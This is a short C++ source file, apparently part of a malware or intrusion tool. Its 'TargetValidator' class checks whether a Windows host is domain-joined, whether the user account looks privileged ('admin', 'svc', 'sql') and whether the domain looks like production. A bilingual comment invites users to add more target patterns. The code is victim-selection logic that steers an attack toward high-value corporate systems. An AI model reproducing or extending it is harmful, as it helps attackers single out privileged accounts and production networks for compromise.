#include <Windows.h>
#include <Lmcons.h>
#include <string>
#include "OperationalSecurity.h"

bool TargetValidator::IsDomainJoined() {
    NETSETUP_JOIN_STATUS status;
    return NetGetJoinInformation(NULL, &status) == NERR_Success && 
           status == NetSetupDomainName;
}

bool TargetValidator::IsHighValueTarget() {
    WCHAR username[UNLEN + 1];
    DWORD username_len = UNLEN + 1;
    GetUserNameW(username, &username_len);
    
    // check for admin accounts (можно добавлять свои варианты) - add your lists also
    return wcsstr(username, L"admin") != nullptr || 
           wcsstr(username, L"svc") != nullptr ||
           wcsstr(username, L"sql") != nullptr;
}

bool TargetValidator::IsProductionEnvironment() {
    WCHAR domain[MAX_PATH];
    DWORD size = MAX_PATH;
    GetComputerNameExW(ComputerNameDnsDomain, domain, &size);
    return wcsstr(domain, L"prod.") != nullptr;
}
